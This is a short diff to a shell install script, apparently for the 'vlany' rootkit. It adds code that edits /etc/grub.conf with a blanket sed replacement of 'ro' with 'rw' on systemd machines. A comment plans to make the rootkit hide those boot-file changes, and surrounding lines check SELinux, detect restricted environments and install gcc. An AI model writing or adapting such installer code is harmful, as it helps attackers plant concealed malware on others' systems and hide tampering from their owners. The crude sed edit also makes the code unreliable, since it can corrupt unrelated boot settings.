@@ -24,7 +24,16 @@ if [ -f /etc/selinux/config ]; then
         echo "SELinux is disabled."
     fi
 fi
-[ ! -z "`stat /proc/1/exe | grep 'systemd'`" ] && { echo "This box uses systemd. Reboot brick likely to happen."; read -p "Press enter to continue or ^C to exit."; }
+
+if [ ! -z "`stat /proc/1/exe | grep 'systemd'`" ]; then
+    if [ -f "/etc/grub.conf" ]; then
+        # temporary fix to systemd reboot brick, going to add a mechanism to vlany to hide changes to the grub.conf file later
+        echo "This box uses systemd. Reboot brick likely to happen."
+        sed -i -- "s/ro/rw/g; s/rwot/root/g;" /etc/grub.conf || { echo "Couldn't patch grub.conf, box will not reboot."; }
+        echo "Done."
+    fi
+fi
+
 [ ! -e /proc ] && { echo "We're in a terrible jail. /proc doesn't exist. Exiting."; exit; }
 if [ ! -f `which gcc 2>/dev/null || echo "NO"` ]; then
     echo "Installing gcc"
